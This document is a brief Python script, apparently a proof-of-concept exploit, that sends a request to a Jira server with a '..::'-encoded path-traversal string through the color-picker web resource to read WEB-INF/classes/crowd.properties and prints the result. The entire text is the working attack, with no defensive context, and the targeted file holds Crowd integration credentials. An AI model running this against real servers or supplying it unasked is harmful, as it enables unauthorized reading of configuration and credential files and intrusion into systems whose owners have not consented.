import sys
import urllib.request

base = sys.argv[1].rstrip('/')
path = '/download/resources/jira.webresources:color-picker-popup/images/..::..::..::..::..::WEB-INF::classes::crowd.properties'
response = urllib.request.urlopen(base + path, timeout=15)
print(response.read())
